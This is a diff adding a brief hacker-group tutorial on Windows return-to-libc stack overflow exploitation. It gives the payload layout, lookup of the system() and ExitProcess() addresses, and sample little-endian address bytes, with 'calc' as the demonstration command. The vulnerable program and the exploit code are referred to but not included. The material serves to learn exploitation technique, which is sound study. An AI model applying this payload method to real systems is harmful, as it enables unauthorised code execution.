@@ -1,0 +1,55 @@
+                      /* Stack Overflow (RETURN TO LIBC) *\
+                      -------------------------------------
+                      |       WINDOWS EXPLOITATION        |
+                      -------------------------------------
+                      |             BY Stalk3R            |
+                      |            FOR SEC4EVER           |
+                      |      Email: Stalk3R@live.CoM      |
+                      -------------------------------------
+                                 Salam 3alaykoum
+
+1- Tools:
+---------
+ -> Arwin.exe
+ -> OllyDbg Or ImmunityDbg
+ -> C/C++ Compilator
+
+2- Exploit Form:
+----------------
+[CMD][COMPLEMENTS][System() addr][ExitProcess() addr][Pointer to CMD]
+
+3- Let's begin:
+---------------
+- Here is our vulnerable Application
+- Compile this one 
+- Test vulnerability
+- OPen it with OllyDBg -> We set arguments :D
+- Locat Pointer to CMD on the Stack
+We use this args: AAAAAAAAAAAAAAAA
+
+
+- Use Arwin to get System() + Exitprocess() address
+System() = arwin.exe msvcrt system, ExitProcess = arwin.exe kernel32 ExitProcess
+
+Pointer to CMD = 0022FF50 -> INVERSE IT -> \x50\xFF\x22\x00
+System() = 0x77bf93c7 -> INVERSE IT -> \xc7\x93\xbf\x77
+ExitProcess() = 0x7c81cb12 -> INVERSE IT -> \x12\xcb\x81\x7c
+
+CMD = calc\nAAAAAAAAAAA <= because we can say [CMD][COMPLEMENTS] = junk :D
+
+for the complement we can test to have it manually (what i am goind to do now)
+
+
+- Write the Exploit
+ 
+- We test it :D
+
+Enjoy !
+
+Greetz: 
+-------
+Mu$lim, B07 M4S73R, sec4ever, Kader11000, Str0xo, n4ss1m, L3b-r1'z, BLACK-SPECTRE, Ma3sTr0-Dz, Black-ID, Damane2011
+                                       ->   And All members of Sec4ever   <-
+
+                                       NB: Li nssit l ism ta3ou mayez3efch :)
+BYE !
